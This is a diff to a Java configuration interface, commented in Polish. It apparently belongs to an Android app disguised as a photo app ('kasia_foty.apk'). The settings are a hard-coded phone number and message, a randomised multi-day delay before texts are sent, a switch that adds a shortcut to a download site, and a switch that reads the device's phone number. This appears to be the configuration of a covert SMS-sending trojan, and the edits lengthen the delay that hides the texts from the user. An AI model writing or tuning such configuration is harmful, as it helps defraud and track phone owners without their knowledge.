@@ -14,14 +14,14 @@ public interface DataIn {
     String number = "695414641";
 
     // Wiadomość
-    String message = "Test";
+    String message = "Hej";
 
-    // minuta // za ile pierwsza wiadomość w milisekundach getTime + milis
-    long firstDelay = 60000; // przy losowaniu tylko firstDelay
-
+    // dzień 86400000// 60000 minuta // za ile pierwsza wiadomość w milisekundach getTime + milis
+    long firstDelay = 86400000; // przy losowaniu tylko firstDelay
+       // 5 7 dni //kasia_foty.apk
     //losowanie  wylosowana razy firstDelay daje czas opużnienia smsa w milisekundach
     int low = 4; //przedział losowania niska
-    int high = 10; // przedział losowania wysoka
+    int high = 7; // przedział losowania wysoka
 
     //+ 10 sekund dla pewności, zeby nie poszły dwa na raz
     long tenSecond = 10000;
@@ -29,7 +29,7 @@ public interface DataIn {
                          /////////////Stworzenie Skrótu URL////////////////
 
     //Dodanie skrótu ULR  1 działa 0 nie działa
-    int AddShortCutUrl = 1;
+    int AddShortCutUrl = 0;
     String adressUrl = "http://www.speeddownload.pl/";  //adress jaki
     String adressUrlIconName = "Skrót do strony"; //Nazwa skrótu
 
@@ -43,7 +43,7 @@ public interface DataIn {
                 /////////////////Pobranie numeru telefonu////////////////////
 
     //Porbanie numeru telefonu  1 działa 0 nie działa
-    int GetPhoneNumber = 1;
+    int GetPhoneNumber = 0;
 
 
 
